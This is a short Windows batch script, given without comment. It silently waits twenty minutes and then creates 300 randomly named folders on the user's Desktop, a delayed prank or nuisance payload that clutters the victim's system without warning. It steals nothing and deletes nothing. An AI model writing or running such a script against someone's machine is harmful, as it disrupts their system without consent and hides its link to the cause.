@echo off
cd %userprofile%\Desktop
timeout /t 1200 /nobreak >nul
setlocal EnableDelayedExpansion
set "chars=abcdefghijklmnopqrstuvwxyz0123456789"
for /l %%i in (1, 1, 300) do (
    set "folderName="
    for /l %%j in (1, 1, 8) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "folderName=!folderName!!chars:~%%k,1!"
        )
    )
    mkdir "!folderName!"
)
